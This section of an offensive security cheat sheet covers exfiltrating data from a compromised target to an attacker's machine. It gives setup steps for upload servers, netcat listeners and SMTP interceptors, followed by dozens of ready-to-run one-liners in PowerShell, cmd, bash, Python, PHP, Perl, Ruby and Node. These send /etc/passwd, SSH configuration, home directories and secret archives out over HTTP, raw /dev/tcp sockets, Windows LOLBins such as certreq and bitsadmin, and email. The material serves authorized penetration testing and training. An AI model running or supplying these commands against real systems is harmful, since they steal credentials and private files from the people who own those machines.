# 02 - Target → Attacker (exfiltration)

> [← README](../../README.md) · [Next section →](03-smb.md)

Pulling files **from the target (RHOST) to the attacker (LHOST)**. Stand up a receiver on the attacker box (upload server or listener), then send from the target.

> **Covered in other files:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), Netcat - [07-netcat.md](07-netcat.md), DNS/ICMP - [12-dns-icmp.md](12-dns-icmp.md), encoding/encryption - [10](10-encoding.md)/[11](11-encryption.md).

> **SSH accounts:** `LHOST_user` / `RHOST_user` are the SSH logins on LHOST/RHOST. Set them before the reverse-tunnel examples: `export LHOST_user=user RHOST_user=user` (see [README variables](../../README.md#notation-and-variables)).

**Jump by OS:** [Attacker - receiver](#1attacker---start-a-receiver) · [Windows target - sending](#2windows-target---sending-everything-on-rhost) · [Linux target - sending](#3linux-target---sending-everything-on-rhost).

---

## Navigation

|  |  |
|---|---|
| [1.💻Attacker - start a receiver](#1attacker---start-a-receiver) | [2.🪟Windows target - sending (everything on RHOST)](#2windows-target---sending-everything-on-rhost) |
| [3.🐧Linux target - sending (everything on RHOST)](#3linux-target---sending-everything-on-rhost) | [4. SMTP / e-mail](#4-smtp--e-mail---exfil-by-mail) |
| [5. Reverse tunnels](#5-reverse-tunnels-the-target-dials-out) | [6. TLS and UDP](#6-tls-and-udp---raw-channels) |
| [7. Blind / OOB exfil](#7-blind--oob-exfil-proving-delivery--crumbs-of-data) | [How it works](#how-it-works) |
| [Which receiver to choose](#which-receiver-to-choose-to-avoid-confusion) | [Integrity check](#integrity-check-mandatory) |
| [Variable forms](#variable-forms) |  |

---

## How it works

```
RHOST (target)                       LHOST (attacker)
  curl -F files=@secret  ────────▶   uploadserver :8000   → /tmp/share/secret
  cat loot > /dev/tcp/... ───────▶   nc -lvnp 4444        → secrets.zip
  certreq -Post ...      ────────▶   serv.py (raw POST)   → received.bin
```

The key point: **each receiver expects a different request format**. Mismatch it and you get `400 Bad Request`, `405`, or an empty file. Below is the "what works with what" table, then each receiver in detail.

---

## Which receiver to choose (to avoid confusion)

| Receiver | Protocol / format | When to use it | What it accepts |
|----------|-------------------|-------------|---------------|
| **uploadserver** | HTTP multipart, field **`files`** | default, the most convenient (has a web page) | `curl -F`, PowerShell `-Form` (PS 7+), browser |
| **serv.py** | HTTP multipart (any field name) + raw POST/PUT | when the field isn't `files` or you're sending a raw body (`certreq`, `--data-binary`) | almost anything |
| **uploadserver + TLS** | HTTPS multipart | HTTP is blocked / you need an encrypted channel | same as uploadserver |
| **nginx PUT** | HTTP `PUT` | you need PUT specifically, a robust receiver | `curl -T`, `WebClient.UploadFile("PUT")` |
| **updog** | HTTP/HTTPS upload+download | fast modern server with password and TLS | browser, `curl` |
| **netcat / socat** | raw TCP | no HTTP at all | `/dev/tcp`, `ncat`, `TcpClient` |
| **certreq** | HTTP POST (LOLBin) | a bypass when everything is blocked | `serv.py` (raw) |
| **bitsadmin / Start-BitsTransfer** | BITS upload protocol | the target only allows BITS | BITS-compatible server (IIS BITS/BITSServer); not `serv.py`/nginx |
| **SMTP (e-mail)** | SMTP (25/587) | the target can send mail outbound | `swaks`, `Send-MailMessage`, `smtplib` |
| **Reverse tunnel** | HTTP/SSH/TLS | the target dials out itself; pull files through the tunnel | `chisel`, `ligolo-ng`, `ssh -R`, `cloudflared` |
| **TLS / UDP raw** | TLS:443 / UDP | TCP:443 or UDP is open, HTTP isn't needed | `socat`, `ncat --ssl`, `openssl` |
| **OOB service** | DNS/HTTP | blind: you need proof of delivery or a few bytes of data | `interactsh`, Collaborator |

> **Important:** `uploadserver` **strictly requires** multipart with the field name `files`. That's why `certreq`, `curl --data-binary`, and `Invoke-RestMethod -InFile` often fail against it: `-InFile` sends a raw body. For `uploadserver` use `-Form` (PS 7+) or the hand-built multipart below; for raw senders use `serv.py` (raw branch) or nginx. BITS is separate: `bitsadmin`/`Start-BitsTransfer` need a BITS-compatible server and do not work against `serv.py` or nginx.

---

## 1.💻Attacker - start a receiver

We start the receiver on **LHOST** (our machine). All the options are below; for what to send from the target, see sections 2 (Windows) and 3 (Linux).

A raw body means the file content is sent as-is, one continuous stream of bytes with no wrapper at all, and the server has to figure out what the file is and what it's called (usually from the name in the URL, e.g. ?file=secrets.txt).

Multipart/form-data packs the file into a structured container with boundaries, where each file carries its field name, original name, and content type, so the server knows exactly what the file is and where to put it.

In short: raw is "here are the bytes, figure it out yourself"; multipart is "here's the file, its name, its type, and the field to put it in".

### uploadserver (HTTP)

A lightweight Python server: it has an upload page, accepts several files at once, and renames on name collisions. Requires **Python 3.9+**.

**Install via pipx:**
```bash
pipx install uploadserver
```

**Install via pip:**
```bash
python3 -m pip install --user uploadserver
```

**Create the upload directory:**
```bash
mkdir -p /tmp/share
```

**Start the server on port 8000:**
```bash
cd /tmp/share && uploadserver 8000
```

Upload page: `http://<LHOST>:8000/upload`. Files land in `/tmp/share/`.

Useful options: `-d <dir>` (directory), `-b <addr>` (interface), `--allow-replace` (overwrite instead of renaming), `--basic-auth user:pass` (password for everything), `--basic-auth-upload user:pass` (password for upload only).

### serv.py

Use it when `uploadserver` doesn't fit: **a different field name** or **a raw body** (`certreq`, `curl --data-binary`). It accepts multipart, raw POST/PUT bodies, and saves into the selected directory (current directory by default).

> Note: the code **does not use the `cgi` module** - it was removed in Python 3.13. Multipart parsing goes through `email`.

**Create the directory:**
```bash
mkdir -p /tmp/share && cd /tmp/share
```

**Receiver:**
> Full source: [scripts/upload/serv.py](../../scripts/upload/serv.py)

Copy `scripts/upload/serv.py` to LHOST and run:

```bash
python3 serv.py                         # default: 0.0.0.0:8000, current directory
python3 serv.py -p 9001 -d /tmp/share   # custom port and loot directory
```

Useful options: `-p/--port` (default `8000`), `-b/--bind`, `-d/--directory`, `--max-size` (`512M`, `2G`, `0` = unlimited; default `1G`), `--token` (required in `X-Upload-Token` or `?token=`), `--tls-cert`/`--tls-key`, and `-q/--quiet`. It accepts `POST`/`PUT`, multipart with any field name, and raw bodies; `GET /health` returns readiness. The response and stdout include the SHA-256 of every saved file. For raw `PUT`, use a path such as `/drop/file.bin` or `?file=file.bin`; `/` gets a timestamped name.

### uploadserver (HTTPS)

The same `uploadserver`, but over TLS - for when HTTP is blocked or you need an encrypted channel.

**Generate a self-signed certificate:**
```bash
openssl req -x509 -out /tmp/server.pem -keyout /tmp/server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
**Start the server on 443 (the upload directory must not contain the cert)**
```bash
cd /tmp/share && uploadserver 443 --server-certificate /tmp/server.pem
```
Errors?

**Find the full path to uploadserver (pipx trouble)**
```
which uploadserver
```

**Start the server on 443 (the upload directory must not contain the cert):**
```bash
cd /tmp/share && /home/kali/.local/bin/uploadserver 443 --server-certificate /tmp/server.pem
```

Upload page: `https://<LHOST>/upload`.

### nginx (PUT)

For when you need `PUT` specifically or `uploadserver` isn't available. nginx stores the file at the path given in the URL.

**Install nginx:**
```bash
sudo apt install -y nginx
```

**Create the upload directory:**
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

**Give ownership to www-data:**
```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Write the `upload.conf` config:**
```bash
sudo tee /etc/nginx/sites-available/upload.conf >/dev/null <<'CONF'
server {
    listen 9001;
    client_max_body_size 0;              # no limit on upload size

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
        create_full_put_path on;
    }
}
CONF
```

**Enable the config and restart nginx:**
```bash
sudo ln -sf /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
sudo rm -f /etc/nginx/sites-enabled/default
sudo systemctl restart nginx
```

**Check for errors:**
```bash
tail -2 /var/log/nginx/error.log
```

Check: opening `http://$LHOST:9001/SecretUploadDirectory/` in a browser returns `403 Forbidden` (that's normal). Files land in `/var/www/uploads/SecretUploadDirectory/`.

### updog

A drop-in replacement for `python -m http.server`: it serves and receives files and supports a password and TLS. Requires **Python 3.11+**.

**Install:**
```bash
pipx install updog
```

**Run (HTTP, directory and port):**
```bash
updog -d /tmp/share -p 8000
```

**Run with TLS (ad-hoc certificate):**
```bash
updog -d /tmp/share -p 8443 --ssl
```

**Run with a password (basic auth, empty login):**
```bash
updog -d /tmp/share -p 8000 --password 'S3cret'
```

### raw TCP (nc / socat)

When there is no HTTP at all but at least one outbound port is open.

**netcat:**
```bash
nc -lvnp 4444 > secrets.zip
```

**socat (appends to the file, survives reconnects):**
```bash
socat -u TCP-LISTEN:4444,reuseaddr,fork OPEN:secrets.zip,creat,append
```

---

## 2.🪟Windows target - sending (everything on RHOST)

All commands run **on the Windows target**. The receiver is already up - see [section 1](#1attacker---start-a-receiver).

> Ready-made tester: [`scripts/Windows-Exfil-tester.ps1`](../../scripts/Windows-Exfil-tester.ps1) - default stops at the first working method; `-All` runs the full matrix and writes a log; `-NoLogs` prints only `Done!`; `-FILE C:\Users\Public\secrets.zip` sets the file to send; `-Receiver uploadserver|servpy|nginx|bits|rawtcp|smb` limits `-All` to the receiver you started; `-UNCPath`/`-RawPort` enable SMB and raw-TCP tests. Start the Kali receiver in the directory where the loot should land.

> **Variables:** `${LHOST}` is your attacker IP. The braced form works before `/` and before `:port`. Under each PowerShell command there is a literal-IP variant in a comment; `192.168.2.5` is an example LHOST - replace it with yours.

### uploadserver (HTTP)

`uploadserver` requires **multipart/form-data** with the field name `files`.

**curl.exe - one file:**
```cmd
curl.exe -X POST http://%LHOST%:8000/upload -F "files=@C:\Users\Public\secrets.txt"
```

**curl.exe - several files:**
```cmd
curl.exe -X POST -F "files=@C:\Users\Public\a.txt" -F "files=@C:\Users\Public\b.txt" http://%LHOST%:8000/upload
```

**PowerShell 7+ - one file (`-Form` builds multipart):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
```

**PowerShell 7+ - several files (one request per file):**
```powershell
foreach ($f in "C:\Users\Public\a.txt","C:\Users\Public\b.txt") {
  Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item $f }
}
# literal IP:
# foreach ($f in "C:\Users\Public\a.txt","C:\Users\Public\b.txt") {
#   Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item $f }
# }
```

**PowerShell 5.1 - multipart by hand (one file):**
```powershell
# literal IP: replace ${LHOST} with 192.168.2.5
$b=[Guid]::NewGuid().ToString();$f=[IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip");$h=[Text.Encoding]::UTF8.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"secrets.zip`"`r`nContent-Type: application/zip`r`n`r`n");$t=[Text.Encoding]::UTF8.GetBytes("`r`n--$b--`r`n");$m=New-Object IO.MemoryStream;$m.Write($h,0,$h.Length);$m.Write($f,0,$f.Length);$m.Write($t,0,$t.Length);Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $m.ToArray()
```

**PowerShell 5.1 - multipart by hand (several files):**
```powershell
# literal IP: replace ${LHOST} with 192.168.2.5
$url="http://${LHOST}:8000/upload";$paths=@("C:\Users\Public\a.txt","C:\Users\Public\b.txt");$b=[Guid]::NewGuid().ToString();$m=New-Object IO.MemoryStream;foreach($p in $paths){$f=[IO.File]::ReadAllBytes($p);$n=[IO.Path]::GetFileName($p);$h=[Text.Encoding]::UTF8.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"$n`"`r`nContent-Type: application/octet-stream`r`n`r`n");$m.Write($h,0,$h.Length);$m.Write($f,0,$f.Length);$m.Write([Text.Encoding]::UTF8.GetBytes("`r`n"),0,2)};$t=[Text.Encoding]::UTF8.GetBytes("--$b--`r`n");$m.Write($t,0,$t.Length);Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $m.ToArray()
```

> **`-InFile` is not multipart.** `Invoke-RestMethod -InFile` sends a raw body and does not populate the `files` field, so it fails against `uploadserver`. Use `-Form` (PowerShell 7+) or the hand-built body above. `-InFile` is correct for `serv.py` raw mode and nginx PUT.

**PowerShell 7+ - HTTPS with multipart:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
```

### serv.py

`serv.py` accepts multipart with any field name, or a raw body. For a raw body the filename comes from `?file=` or `Content-Disposition`.

**cmd curl.exe - raw body + `?file=`:**
```cmd
curl.exe -X POST --data-binary "@C:\Users\Public\secrets.txt" "http://%LHOST%:8000/upload?file=secrets.txt"
```

**PowerShell - raw body as bytes:**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
Invoke-WebRequest -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
# literal IP:
# $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
# Invoke-WebRequest -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
```

**PowerShell - `-InFile` raw body (the correct use of `-InFile`):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt"
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt"
```

**PowerShell 7+ - HTTPS raw body:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt" -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt" -SkipCertificateCheck
```

**PowerShell 5.1 - multipart by hand (several files):**
```powershell
# literal IP: replace ${LHOST} with 192.168.2.5
$b=[Guid]::NewGuid().ToString();$e=[Text.Encoding]::GetEncoding("iso-8859-1");$d="";foreach($p in "C:\Users\Public\a.txt","C:\Users\Public\b.txt"){$n=[IO.Path]::GetFileName($p);$d+="--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"$n`"`r`nContent-Type: application/octet-stream`r`n`r`n"+$e.GetString([IO.File]::ReadAllBytes($p))+"`r`n"};$d+="--$b--`r`n";Invoke-WebRequest -Uri "http://${LHOST}:8000/upload" -Method Post -Body $e.GetBytes($d) -ContentType "multipart/form-data; boundary=$b"
```

### uploadserver (HTTPS)

**curl.exe with `-k`:**
```cmd
curl.exe -k -X POST https://%LHOST%/upload -F "files=@C:\Users\Public\secrets.txt"
```

**PowerShell 7+ - multipart via `-Form`:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
```

**Older PowerShell - bypass cert validation for the current session:**
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
```

**Older PowerShell - multipart by hand:**
```powershell
# literal IP: replace ${LHOST} with 192.168.2.5
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$b=[Guid]::NewGuid().ToString();$e=[Text.Encoding]::GetEncoding("iso-8859-1");$d="--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"secrets.txt`"`r`nContent-Type: application/octet-stream`r`n`r`n"+$e.GetString([IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"))+"`r`n--$b--`r`n";Invoke-WebRequest -Uri "https://${LHOST}/upload" -Method Post -Body $e.GetBytes($d) -ContentType "multipart/form-data; boundary=$b"
```

### nginx (PUT)

**PowerShell - PUT with `-InFile` (the body is raw, so `-InFile` is correct here):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:9001/SecretUploadDirectory/secrets.zip" -Method Put -InFile "C:\Users\Public\secrets.zip"
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:9001/SecretUploadDirectory/secrets.zip" -Method Put -InFile "C:\Users\Public\secrets.zip"
```

**PowerShell - WebClient PUT:**
```powershell
(New-Object Net.WebClient).UploadFile("http://${LHOST}:9001/SecretUploadDirectory/secrets.zip","PUT","C:\Users\Public\secrets.zip")
# literal IP:
# (New-Object Net.WebClient).UploadFile("http://192.168.2.5:9001/SecretUploadDirectory/secrets.zip","PUT","C:\Users\Public\secrets.zip")
```

**curl.exe -T (PUT):**
```cmd
curl.exe -T C:\Users\Public\secrets.zip http://%LHOST%:9001/SecretUploadDirectory/secrets.zip
```

### updog

**curl.exe:**
```cmd
curl.exe -X POST -F "file=@C:\Users\Public\secrets.zip" -F "path=." http://%LHOST%:8000/upload
```

https:
```cmd
curl.exe -X POST -F "file=@C:\Users\Public\secrets.zip" -F "path=." https://%LHOST%:8000/upload --insecure
```

### raw TCP (nc / socat)

**ncat.exe (from the nmap package):**
```cmd
ncat.exe %LHOST% 4444 < C:\Users\Public\secrets.zip
```

**Pure PowerShell, no external tools:**
```powershell
$c = New-Object Net.Sockets.TcpClient("${LHOST}", 4444)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$s.Write($b, 0, $b.Length); $s.Flush(); $s.Close(); $c.Close()
# literal IP:
# $c = New-Object Net.Sockets.TcpClient("192.168.2.5", 4444); $s=$c.GetStream(); $b=[IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip"); $s.Write($b,0,$b.Length); $s.Flush(); $s.Close(); $c.Close()
```

Or, without a variable:
```powershell
$c=New-Object Net.Sockets.TcpClient("192.168.2.5",4444); $f=[IO.File]::OpenRead("C:\Users\Public\secrets.zip"); $f.CopyTo($c.GetStream()); $c.Close(); $f.Close()
```



### Windows LOLBins (bypass)

For when the "normal" methods are blocked but the system binaries are untouched. Remember: they don't send multipart, so catch them with `serv.py` (raw branch) or `nc`.


**certutil encode -> curl send -> decode on the attacker:**
```cmd
certutil -encode C:\Users\Public\secrets.zip C:\Users\Public\s.txt
curl.exe -X POST --data-binary "@C:\Users\Public\s.txt" "http://%LHOST%:8000/upload?file=s.txt"
```
On Linux, strip the PEM wrapper before decoding:
```bash
tr -d '\r' < s.txt | sed '/^-----/d' | base64 -d > secrets.zip
```
> `base64 -d s.txt` fails because `certutil -encode` adds `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----`. Either strip those lines as shown, or use `certutil -decode` on Windows.


#### certreq - HTTP POST with a built-in binary

**LHOST - raw-POST receiver (`serv.py`):**
```bash
python3 serv.py
```

**LHOST - or just a logging nc:**
```bash
nc -lvnp 80 > received.txt
```

**RHOST (CMD) - certreq sends the file content as the POST body:**
```cmd
certreq.exe -Post -config http://%LHOST%:80/ C:\Users\Public\flag.txt
```

#### bitsadmin / Start-BitsTransfer - upload via BITS
May not work.
**LHOST - use a BITS-compatible server (IIS BITS/BITSServer):**

Generic HTTP receivers (`serv.py`, uploadserver, nginx) do not implement BITS upload and will reject the request; use a BITS server for these commands.

**RHOST (CMD) - a BITS upload job:**
```cmd
bitsadmin /transfer myjob /upload http://%LHOST%:8000/upload C:\Users\Public\secrets.zip
```

**RHOST (PowerShell) - the same via the BitsTransfer module:**
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://${LHOST}:8000/upload"
# literal IP:
# Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://192.168.2.5:8000/upload"
```

> BITS is picky about the server (it sends its own headers and `Content-Range`). `serv.py` and nginx PUT are not BITS servers: they will not accept this upload. Use a BITS-compatible server or choose another method.

#### PowerShell - quick options

**multipart with a filename (`uploadserver`; PS 7+):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
```

**Raw body as bytes (`serv.py` raw branch):**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
Invoke-WebRequest -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
# literal IP:
# $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"); Invoke-WebRequest -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
```

**WebClient.UploadFile with an arbitrary method (PUT/POST):**
```powershell
(New-Object Net.WebClient).UploadFile("http://${LHOST}:9001/SecretUploadDirectory/x.zip", "PUT", "C:\Users\Public\secrets.zip")
# literal IP:
# (New-Object Net.WebClient).UploadFile("http://192.168.2.5:9001/SecretUploadDirectory/x.zip", "PUT", "C:\Users\Public\secrets.zip")
```

---

## 3.🐧Linux target - sending (everything on RHOST)

All commands run **on the Linux target**. The receiver is already up - see [section 1](#1attacker---start-a-receiver).

### uploadserver (HTTP)

**One file (the field must be `files`):**
```bash
curl -X POST http://$LHOST:8000/upload -F 'files=@/etc/passwd'
```

**Several files at once:**
```bash
curl -X POST http://$LHOST:8000/upload -F 'files=@/etc/hostname' -F 'files=@/etc/hosts'
```

**Send a directory recursively:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -s -X POST http://$LHOST:8000/upload -F "files=@$f" && echo "[+] $f"
done
```

**Streamed with no intermediate file (tar → upload):**
```bash
tar czf - /etc/ssh | curl -s -X POST http://$LHOST:8000/upload -F 'files=@-;filename=secrets.tar.gz'
```

**Via python3 + requests (if curl is missing):**
```bash
python3 -c 'import requests;requests.post("http://'"$LHOST"':8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### serv.py

**multipart with an arbitrary field name:**
```bash
curl -X POST http://$LHOST:8000/upload -F 'anything=@/etc/passwd'
```

**Raw body + name in the query (`?file=`):**
```bash
curl -X POST --data-binary @/etc/passwd "http://$LHOST:8000/upload?file=passwd"
```

**Raw body + name in the `Content-Disposition` header:**
```bash
curl -X POST -H 'Content-Disposition: attachment; filename="passwd"' --data-binary @/etc/passwd http://$LHOST:8000/upload
```
**WGET upload**
```bash
wget --post-file="/etc/passwd" http://$LHOST:8000/upload
```

### uploadserver (HTTPS)

**One file (`-k` = don't validate the self-signed cert):**
```bash
curl -k -X POST https://$LHOST/upload -F 'files=@/etc/passwd'
```

**Several files:**
```bash
curl -k -X POST https://$LHOST/upload -F 'files=@/etc/hostname' -F 'files=@/etc/hosts'
```

**Recursively:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -ks -X POST https://$LHOST/upload -F "files=@$f" && echo "[+] $f"
done
```

**Via python3 + requests (`verify=False`):**
```bash
python3 -c 'import requests;requests.post("https://'"$LHOST"'/upload",files={"files":open("/etc/passwd","rb")},verify=False)'
```

### nginx (PUT)

**curl -T (PUT), the filename goes at the end of the URL:**
```bash
curl -T /etc/passwd http://$LHOST:9001/SecretUploadDirectory/passwd.txt
```

**Recursively:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -s -T "$f" "http://$LHOST:9001/SecretUploadDirectory/$(basename "$f")" && echo "[+] $f"
done
```

**wget - PUT with the body from a file (if curl is missing):**
```bash
wget --method=PUT --body-file=/etc/passwd http://$LHOST:9001/SecretUploadDirectory/passwd.txt
```

### updog

**multipart:**
```bash
curl -X POST -F "file=@/etc/passwd" -F "path=/tmp/share" http://$LHOST:8000/upload
```

**With a password:**
```bash
curl -u ":S3cret" -X POST -F "file=@/etc/passwd" -F "path=/tmp/share" http://$LHOST:8000/upload
```


### raw TCP (nc / socat)

**bash only, no tools:**
```bash
cat secrets.zip > /dev/tcp/$LHOST/4444
```

**socat:**
```bash
socat -u FILE:secrets.zip TCP:$LHOST:4444
```

### Linux techniques (when curl/wget are missing)

#### bash /dev/tcp - nothing but bash

**LHOST - listen:**
```bash
nc -lvnp 9001 > secrets.tar.gz
```

**RHOST - push the file into the socket:**
```bash
cat /home/victim/secrets.tar.gz > /dev/tcp/$LHOST/9001
```

**RHOST - no cat, pure redirection:**
```bash
exec 3>/dev/tcp/$LHOST/9001; cat secrets.tar.gz >&3; exec 3>&-
```

> This is a **bash** feature (and ksh). It doesn't exist in `sh`/`dash` - check `ls -la /bin/sh` and use `bash -c '...'` if needed.

#### python3 - requests or the stdlib

**requests (multipart, field `files` - for uploadserver):**
```bash
python3 -c 'import requests;requests.post("http://'"$LHOST"':8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Stdlib only: raw POST as bytes (`serv.py` raw branch):**
```bash
python3 -c 'import urllib.request; d=open("/etc/passwd","rb").read(); urllib.request.urlopen(urllib.request.Request("http://'"$LHOST"':8000/upload?file=passwd", data=d, method="POST"))'
```

#### tar streaming (a directory with no intermediate file)

**tar → PUT (nginx):**
```bash
tar czf - /home/victim | curl -s -T - http://$LHOST:9001/SecretUploadDirectory/home.tar.gz
```

**tar → raw TCP:**
```bash
tar czf - /home/victim | nc $LHOST 4444
```

#### One-liners in other languages (when only an interpreter is available)

**PHP - raw POST to `serv.py`:**
```bash
php -r '$d=file_get_contents("/etc/passwd"); file_get_contents("http://'"$LHOST"':8000/upload?file=passwd", false, stream_context_create(["http"=>["method"=>"POST","header"=>"Content-Type: application/octet-stream","content"=>$d]]));'
```

**Perl (HTTP::Tiny) - raw POST:**
```bash
perl -MHTTP::Tiny -e 'open F,"<","/etc/passwd"; local $/; $d=<F>; HTTP::Tiny->new->post("http://'"$LHOST"':8000/upload?file=passwd",{content=>$d})'
```

**Ruby - raw TCP to the listener:**
LHOST:
```
nc -l -p 4444 > /tmp/passwd_received
```
RHOST:
```bash
ruby -rsocket -e 's=TCPSocket.new("'"$LHOST"'",4444); s.write(File.binread("/etc/passwd")); s.close'
```

**Node.js - raw POST:**
```bash
node -e 'const f=require("fs"),h=require("http"),d=f.readFileSync("/etc/passwd");const r=h.request({host:"'"$LHOST"'",port:8000,path:"/upload?file=passwd",method:"POST"},()=>{});r.end(d)'
```

---

## 4. SMTP / e-mail - exfil by mail

You need an SMTP server (your own or public) and a mailbox to receive.

**Ports and modes:**

| Port | Mode | When to use it |
|------|-------|--------------------|
| **25** | SMTP (plain), optionally STARTTLS | internal relaying; often blocked outbound |
| **587** | submission + **STARTTLS** | the standard for sending from a client; TLS upgraded after `EHLO` |
| **465** | **SMTPS** (implicit TLS) | TLS from the first byte; use it if 587 is blocked |

> 587/465 need a certificate. On the receiving side we use a **self-signed** one, and on the sending side we **disable** cert validation - otherwise you get `certificate verify failed`.

### Attacker - receiving

**A real mailbox (simplest):** create an account (Gmail etc.) and check the attachments.

**Self-signed certificate (for 587/465):**
```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout smtp-key.pem -out smtp-cert.pem \
  -subj "/CN=$LHOST" -addext "subjectAltName=IP:$LHOST"
```

**Interceptor - plain (25):**
```bash
pipx install aiosmtpd
aiosmtpd -n -l 0.0.0.0:25
```

Decode pipeline
```bash
aiosmtpd -n -l 0.0.0.0:25 | tee mail.log
```
Once the base64 mail arrives, press CTRL+C
Then
```
sed -n '/MESSAGE FOLLOWS/,/END MESSAGE/p' mail.log | sed '1d;$d' | sed '/^X-Peer:/d' | awk 'f{print} /Content-Disposition: attachment/{f=1}' | sed '1d' | tr -d '\r\n ' | base64 -d > secrets.zip
```
Strips all the noise, decodes the base64, and writes the final file.

**Interceptor - STARTTLS (587):**
```bash
aiosmtpd -n -l 0.0.0.0:587 --tlscert smtp-cert.pem --tlskey smtp-key.pem
```

**Interceptor - SMTPS (465, implicit TLS):**
```bash
aiosmtpd -n -l 0.0.0.0:465 --smtpscert smtp-cert.pem --smtpskey smtp-key.pem
```

> With `--tlscert`, aiosmtpd **requires** STARTTLS before `AUTH`/`MAIL`. Disable it with `--no-requiretls`.

### Sending from Linux - SMTP / e-mail

**Our interceptor (`$LHOST`) - plain (25):**
```bash
swaks --to x@$LHOST --server $LHOST:25 --attach @/etc/passwd --body 'loot'
```

**Our interceptor - STARTTLS (587, self-signed cert):**
```bash
swaks --to x@$LHOST --server $LHOST:587 --tls --attach @/etc/passwd --body 'loot'
```

**Our interceptor - SMTPS (465, implicit TLS):**
```bash
python3 -c 'import smtplib,ssl,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP_SSL("'$LHOST'",465,context=ssl._create_unverified_context()); s.send_message(m)'
```

**Our interceptor - python3 + smtplib (25):**
```bash
python3 -c 'import smtplib,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP("'$LHOST'",25); s.send_message(m)'
```

**External relay - swaks 587 (STARTTLS + auth):**
```bash
swaks --to you@example.com --from x@example.com --server smtp.example.com:587 --tls --auth LOGIN --auth-user user --auth-password 'pass' --attach @/etc/passwd --body 'loot'
```

